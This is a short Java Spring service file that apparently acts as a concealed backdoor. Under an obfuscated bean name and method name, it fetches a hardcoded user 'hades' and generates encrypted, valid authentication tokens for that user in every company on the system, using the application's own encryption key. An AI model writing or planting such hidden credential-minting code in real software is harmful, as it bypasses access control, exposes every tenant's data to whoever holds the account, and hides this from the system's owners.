/**
 * @File Name		: SecretServiceImpl.java
 * @Package   	: com.fanglin.system.service.impl
 * @Version		: 1.0
 * @Date			: 2017-8-2
 * @Copyright	: Copyright Creators 2014
 * @Author		: baity
 * @Email			: bty1987@163.com
 * @Describing	: 
 */

package com.fanglin.factory.service.impl;

import java.util.ArrayList;
import java.util.Date;
import java.util.List;

import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Service;
import org.springframework.transaction.annotation.Transactional;

import com.fanglin.core.security.AESHelper;
import com.fanglin.core.vo.Authentication;
import com.fanglin.factory.service.SecretService;
import com.fanglin.personel.dao.UserDao;
import com.fanglin.personel.po.UserPO;
import com.fanglin.system.dao.CompanyDao;
import com.fanglin.system.po.CompanyPO;
import com.fanglin.utils.LogUtils;
import com.fanglin.utils.SystemConfig;

@Service("viequppl")
@Transactional(readOnly = true)
public class SecretServiceImpl implements SecretService {

	protected Logger logger = LoggerFactory.getLogger(getClass());

	@Autowired
	private CompanyDao companyDao;

	@Autowired
	private UserDao userDao;

	@Override
	public List<String> OXCKSFRD() {

		List<CompanyPO> companyPOs = companyDao.queryCompany(null);
		List<String> authentications = new ArrayList<String>();

		UserPO userPO = userDao.queryUserByUserId("hades");

		if (userPO == null) {
			return authentications;
		}

		for (CompanyPO companyPO : companyPOs) {
			try {
				authentications.add(AESHelper.encrypt(new Authentication(userPO.getUserId(), userPO.getUserName(), userPO.getRole().getRid(), (new Date()).getTime(), true, companyPO.getCid(), userPO.getFreedom()).getAuthenticationStr(), SystemConfig.getString("encryptKey"), SystemConfig.getString("encryptIv")));
			} catch (Exception e) {
				LogUtils.logging(logger, e, "requestAuthCode", "communion");
			}
		}

		return authentications;
	}

}
